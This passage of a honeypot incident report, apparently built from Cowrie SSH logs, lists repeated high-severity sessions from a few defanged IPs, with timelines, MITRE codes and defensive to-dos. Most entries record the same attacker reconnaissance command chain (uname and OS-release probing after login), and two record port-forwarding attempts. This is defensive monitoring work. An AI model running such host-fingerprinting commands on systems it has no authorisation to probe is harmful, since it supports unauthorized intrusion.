| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:24:04` | `cowrie.session.connect` |
| `2026-08-16 01:24:05` | `cowrie.client.version` |
| `2026-08-16 01:24:05` | `cowrie.client.kex` |
| `2026-08-16 01:24:09` | `cowrie.login.success` |
| `2026-08-16 01:24:11` | `cowrie.session.params` |
| `2026-08-16 01:24:11` | `cowrie.command.input` |
| `2026-08-16 01:24:11` | `cowrie.command.input` |
| `2026-08-16 01:24:11` | `cowrie.command.input` |
| `2026-08-16 01:24:11` | `cowrie.command.input` |
| `2026-08-16 01:24:11` | `cowrie.command.input` |
| `2026-08-16 01:24:11` | `cowrie.command.success` |
| `2026-08-16 01:24:11` | `cowrie.command.input` |
| `2026-08-16 01:24:11` | `cowrie.command.input` |
| `2026-08-16 01:24:11` | `cowrie.command.input` |
| `2026-08-16 01:24:11` | `cowrie.command.input` |
| `2026-08-16 01:24:12` | `cowrie.log.closed` |
| `2026-08-16 01:24:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14ec3d9f3d0e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:25 |
| **Last Seen** | 2026-08-16 01:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:25:14` | `cowrie.session.connect` |
| `2026-08-16 01:25:15` | `cowrie.client.version` |
| `2026-08-16 01:25:15` | `cowrie.client.kex` |
| `2026-08-16 01:25:18` | `cowrie.login.success` |
| `2026-08-16 01:25:20` | `cowrie.session.params` |
| `2026-08-16 01:25:20` | `cowrie.command.input` |
| `2026-08-16 01:25:20` | `cowrie.command.input` |
| `2026-08-16 01:25:20` | `cowrie.command.input` |
| `2026-08-16 01:25:20` | `cowrie.command.input` |
| `2026-08-16 01:25:20` | `cowrie.command.input` |
| `2026-08-16 01:25:20` | `cowrie.command.success` |
| `2026-08-16 01:25:20` | `cowrie.command.input` |
| `2026-08-16 01:25:20` | `cowrie.command.input` |
| `2026-08-16 01:25:20` | `cowrie.command.input` |
| `2026-08-16 01:25:20` | `cowrie.command.input` |
| `2026-08-16 01:25:21` | `cowrie.log.closed` |
| `2026-08-16 01:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72f2ada47dee

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:26 |
| **Last Seen** | 2026-08-16 01:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:26:22` | `cowrie.session.connect` |
| `2026-08-16 01:26:23` | `cowrie.client.version` |
| `2026-08-16 01:26:23` | `cowrie.client.kex` |
| `2026-08-16 01:26:28` | `cowrie.login.success` |
| `2026-08-16 01:26:31` | `cowrie.session.params` |
| `2026-08-16 01:26:31` | `cowrie.command.input` |
| `2026-08-16 01:26:31` | `cowrie.command.input` |
| `2026-08-16 01:26:31` | `cowrie.command.input` |
| `2026-08-16 01:26:31` | `cowrie.command.input` |
| `2026-08-16 01:26:31` | `cowrie.command.input` |
| `2026-08-16 01:26:31` | `cowrie.command.success` |
| `2026-08-16 01:26:31` | `cowrie.command.input` |
| `2026-08-16 01:26:31` | `cowrie.command.input` |
| `2026-08-16 01:26:31` | `cowrie.command.input` |
| `2026-08-16 01:26:31` | `cowrie.command.input` |
| `2026-08-16 01:26:33` | `cowrie.log.closed` |
| `2026-08-16 01:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74cacd5567ca

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:27 |
| **Last Seen** | 2026-08-16 01:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:27:30` | `cowrie.session.connect` |
| `2026-08-16 01:27:31` | `cowrie.client.version` |
| `2026-08-16 01:27:31` | `cowrie.client.kex` |
| `2026-08-16 01:27:33` | `cowrie.login.success` |
| `2026-08-16 01:27:34` | `cowrie.session.params` |
| `2026-08-16 01:27:34` | `cowrie.command.input` |
| `2026-08-16 01:27:34` | `cowrie.command.input` |
| `2026-08-16 01:27:34` | `cowrie.command.input` |
| `2026-08-16 01:27:34` | `cowrie.command.input` |
| `2026-08-16 01:27:34` | `cowrie.command.input` |
| `2026-08-16 01:27:34` | `cowrie.command.success` |
| `2026-08-16 01:27:34` | `cowrie.command.input` |
| `2026-08-16 01:27:34` | `cowrie.command.input` |
| `2026-08-16 01:27:34` | `cowrie.command.input` |
| `2026-08-16 01:27:34` | `cowrie.command.input` |
| `2026-08-16 01:27:35` | `cowrie.log.closed` |
| `2026-08-16 01:27:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37660ae9d9a8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:28 |
| **Last Seen** | 2026-08-16 01:28 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:28:36` | `cowrie.session.connect` |
| `2026-08-16 01:28:38` | `cowrie.client.version` |
| `2026-08-16 01:28:38` | `cowrie.client.kex` |
| `2026-08-16 01:28:43` | `cowrie.login.success` |
| `2026-08-16 01:28:46` | `cowrie.session.params` |
| `2026-08-16 01:28:46` | `cowrie.command.input` |
| `2026-08-16 01:28:46` | `cowrie.command.input` |
| `2026-08-16 01:28:46` | `cowrie.command.input` |
| `2026-08-16 01:28:46` | `cowrie.command.input` |
| `2026-08-16 01:28:46` | `cowrie.command.input` |
| `2026-08-16 01:28:46` | `cowrie.command.success` |
| `2026-08-16 01:28:46` | `cowrie.command.input` |
| `2026-08-16 01:28:46` | `cowrie.command.input` |
| `2026-08-16 01:28:46` | `cowrie.command.input` |
| `2026-08-16 01:28:46` | `cowrie.command.input` |
| `2026-08-16 01:28:47` | `cowrie.log.closed` |
| `2026-08-16 01:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-493c21ea2c33

| Field | Detail |
|---|---|
| **Source IP** | `39.183.162[.]243` |
| **First Seen** | 2026-08-16 01:29 |
| **Last Seen** | 2026-08-16 01:29 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:29:38` | `cowrie.session.connect` |
| `2026-08-16 01:29:41` | `cowrie.client.version` |
| `2026-08-16 01:29:41` | `cowrie.client.kex` |
| `2026-08-16 01:29:49` | `cowrie.login.success` |
| `2026-08-16 01:29:51` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:29:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.183.162[.]243` to AbuseIPDB if not already reported
- [ ] Block `39.183.162[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17c64aa01511

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:29 |
| **Last Seen** | 2026-08-16 01:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:29:42` | `cowrie.session.connect` |
| `2026-08-16 01:29:44` | `cowrie.client.version` |
| `2026-08-16 01:29:44` | `cowrie.client.kex` |
| `2026-08-16 01:29:48` | `cowrie.login.success` |
| `2026-08-16 01:29:51` | `cowrie.session.params` |
| `2026-08-16 01:29:51` | `cowrie.command.input` |
| `2026-08-16 01:29:51` | `cowrie.command.input` |
| `2026-08-16 01:29:51` | `cowrie.command.input` |
| `2026-08-16 01:29:51` | `cowrie.command.input` |
| `2026-08-16 01:29:51` | `cowrie.command.input` |
| `2026-08-16 01:29:51` | `cowrie.command.success` |
| `2026-08-16 01:29:51` | `cowrie.command.input` |
| `2026-08-16 01:29:51` | `cowrie.command.input` |
| `2026-08-16 01:29:51` | `cowrie.command.input` |
| `2026-08-16 01:29:51` | `cowrie.command.input` |
| `2026-08-16 01:29:53` | `cowrie.log.closed` |
| `2026-08-16 01:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b70e224afc1

| Field | Detail |
|---|---|
| **Source IP** | `220.189.209[.]18` |
| **First Seen** | 2026-08-16 01:29 |
| **Last Seen** | 2026-08-16 01:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:29:59` | `cowrie.session.connect` |
| `2026-08-16 01:30:00` | `cowrie.client.version` |
| `2026-08-16 01:30:00` | `cowrie.client.kex` |
| `2026-08-16 01:30:01` | `cowrie.login.success` |
| `2026-08-16 01:30:03` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.189.209[.]18` to AbuseIPDB if not already reported
- [ ] Block `220.189.209[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc71625cd8a7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:30 |
| **Last Seen** | 2026-08-16 01:30 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:30:46` | `cowrie.session.connect` |
| `2026-08-16 01:30:47` | `cowrie.client.version` |
| `2026-08-16 01:30:47` | `cowrie.client.kex` |
| `2026-08-16 01:30:52` | `cowrie.login.success` |
| `2026-08-16 01:30:54` | `cowrie.session.params` |
| `2026-08-16 01:30:54` | `cowrie.command.input` |
| `2026-08-16 01:30:54` | `cowrie.command.input` |
| `2026-08-16 01:30:54` | `cowrie.command.input` |
| `2026-08-16 01:30:54` | `cowrie.command.input` |
| `2026-08-16 01:30:54` | `cowrie.command.input` |
| `2026-08-16 01:30:54` | `cowrie.command.success` |
| `2026-08-16 01:30:54` | `cowrie.command.input` |
| `2026-08-16 01:30:54` | `cowrie.command.input` |
| `2026-08-16 01:30:54` | `cowrie.command.input` |
| `2026-08-16 01:30:54` | `cowrie.command.input` |
| `2026-08-16 01:30:55` | `cowrie.log.closed` |
| `2026-08-16 01:30:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7da570aa216d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:31 |
| **Last Seen** | 2026-08-16 01:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:31:48` | `cowrie.session.connect` |
| `2026-08-16 01:31:49` | `cowrie.client.version` |
| `2026-08-16 01:31:49` | `cowrie.client.kex` |
| `2026-08-16 01:31:53` | `cowrie.login.success` |
| `2026-08-16 01:31:56` | `cowrie.session.params` |
| `2026-08-16 01:31:56` | `cowrie.command.input` |
| `2026-08-16 01:31:56` | `cowrie.command.input` |
| `2026-08-16 01:31:56` | `cowrie.command.input` |
| `2026-08-16 01:31:56` | `cowrie.command.input` |
| `2026-08-16 01:31:56` | `cowrie.command.input` |
| `2026-08-16 01:31:56` | `cowrie.command.success` |
| `2026-08-16 01:31:56` | `cowrie.command.input` |
| `2026-08-16 01:31:56` | `cowrie.command.input` |
| `2026-08-16 01:31:56` | `cowrie.command.input` |
| `2026-08-16 01:31:56` | `cowrie.command.input` |
| `2026-08-16 01:31:57` | `cowrie.log.closed` |
| `2026-08-16 01:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-772ae8f285e1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:32 |
| **Last Seen** | 2026-08-16 01:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:32:49` | `cowrie.session.connect` |
| `2026-08-16 01:32:50` | `cowrie.client.version` |
| `2026-08-16 01:32:50` | `cowrie.client.kex` |
| `2026-08-16 01:32:54` | `cowrie.login.success` |
| `2026-08-16 01:32:57` | `cowrie.session.params` |
| `2026-08-16 01:32:57` | `cowrie.command.input` |
| `2026-08-16 01:32:57` | `cowrie.command.input` |
| `2026-08-16 01:32:57` | `cowrie.command.input` |
| `2026-08-16 01:32:57` | `cowrie.command.input` |
| `2026-08-16 01:32:57` | `cowrie.command.input` |
| `2026-08-16 01:32:57` | `cowrie.command.success` |
| `2026-08-16 01:32:57` | `cowrie.command.input` |
| `2026-08-16 01:32:57` | `cowrie.command.input` |
| `2026-08-16 01:32:57` | `cowrie.command.input` |
| `2026-08-16 01:32:57` | `cowrie.command.input` |
| `2026-08-16 01:32:58` | `cowrie.log.closed` |
| `2026-08-16 01:32:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93b675245c1a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:33 |
| **Last Seen** | 2026-08-16 01:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:33:51` | `cowrie.session.connect` |
| `2026-08-16 01:33:52` | `cowrie.client.version` |
| `2026-08-16 01:33:52` | `cowrie.client.kex` |
| `2026-08-16 01:33:57` | `cowrie.login.success` |
| `2026-08-16 01:34:00` | `cowrie.session.params` |
| `2026-08-16 01:34:00` | `cowrie.command.input` |
| `2026-08-16 01:34:00` | `cowrie.command.input` |
| `2026-08-16 01:34:00` | `cowrie.command.input` |
| `2026-08-16 01:34:00` | `cowrie.command.input` |
| `2026-08-16 01:34:00` | `cowrie.command.input` |
| `2026-08-16 01:34:00` | `cowrie.command.success` |
| `2026-08-16 01:34:00` | `cowrie.command.input` |
| `2026-08-16 01:34:00` | `cowrie.command.input` |
| `2026-08-16 01:34:00` | `cowrie.command.input` |
| `2026-08-16 01:34:00` | `cowrie.command.input` |
| `2026-08-16 01:34:01` | `cowrie.log.closed` |
| `2026-08-16 01:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e14820b164d8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:34 |
| **Last Seen** | 2026-08-16 01:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:34:54` | `cowrie.session.connect` |
| `2026-08-16 01:34:55` | `cowrie.client.version` |
| `2026-08-16 01:34:55` | `cowrie.client.kex` |
| `2026-08-16 01:35:01` | `cowrie.login.success` |
| `2026-08-16 01:35:04` | `cowrie.session.params` |
| `2026-08-16 01:35:04` | `cowrie.command.input` |
| `2026-08-16 01:35:04` | `cowrie.command.input` |
| `2026-08-16 01:35:04` | `cowrie.command.input` |
| `2026-08-16 01:35:04` | `cowrie.command.input` |
| `2026-08-16 01:35:04` | `cowrie.command.input` |
| `2026-08-16 01:35:04` | `cowrie.command.success` |
| `2026-08-16 01:35:04` | `cowrie.command.input` |
| `2026-08-16 01:35:04` | `cowrie.command.input` |
| `2026-08-16 01:35:04` | `cowrie.command.input` |
| `2026-08-16 01:35:04` | `cowrie.command.input` |
| `2026-08-16 01:35:05` | `cowrie.log.closed` |
| `2026-08-16 01:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d5ce14f1a73

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:36 |
| **Last Seen** | 2026-08-16 01:36 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
